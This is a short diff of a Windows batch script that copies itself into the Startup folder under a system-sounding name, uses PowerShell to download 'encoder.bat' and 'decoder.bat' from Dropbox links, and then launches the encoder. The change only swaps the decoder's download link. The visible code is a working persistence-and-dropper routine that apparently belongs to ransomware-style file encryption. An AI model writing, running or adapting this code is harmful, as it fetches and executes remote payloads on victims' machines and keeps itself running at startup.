@@ -32,7 +32,7 @@ copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sys_serv
 
 :: Download (Ensure these links are direct download links)
 powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/o2kp3013bm6jbeomi4rk6/encoder.bat?rlkey=xjv2zm6vw02l4fwyv4jfmdtco&st=dyl8pw2y&dl=1' -OutFile '%USERPROFILE%\Downloads\encoder.bat'"
-powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/sb07n1jlv1b6o6mtnvvci/decoder.bat?rlkey=k63knpiv08b8cqbg87ipa1oc6&st=39zpleo4&dl=1' -OutFile '%USERPROFILE%\Desktop\decoder.bat'"
+powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/hb90ow03dngyvi3pxfj8d/decoder.bat?rlkey=wzrj7ufd8aokupy0txbzm4fvs&st=gyhfiewm&dl=1' -OutFile '%USERPROFILE%\Desktop\decoder.bat'"
 
 echo [+] Executing Encoder...
 start "" "%USERPROFILE%\Downloads\encoder.bat"
